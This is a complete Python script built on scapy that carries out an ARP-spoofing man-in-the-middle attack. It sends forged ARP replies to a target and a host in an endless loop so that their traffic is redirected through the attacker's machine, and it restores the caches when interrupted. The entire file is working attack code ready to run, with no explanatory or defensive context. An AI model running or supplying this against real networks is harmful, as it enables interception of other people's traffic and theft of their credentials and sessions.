from scapy.all import Ether, ARP, srp, send
import argparse, time, os, sys, textwrap

def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        self_mac=ARP().hwsrc
        print(f"[+] Send to {target_ip}: {host_ip} is-at {self_mac}")

def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op='is-at')
    send(arp_response, verbose=0, count=7)
    if verbose:
        print(f"[+] Send to {target_ip}: {host_ip} is-at {host_mac}")

if __name__ == "__main__":
    target = sys.argv[1]
    host = sys.argv[2]
    Verbose = True
    try:
        while True:
            spoof(target, host, Verbose)
            spoof(host, target, Verbose)
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL-C, restoring network...")
        restore(target, host)
        restore(host, target)
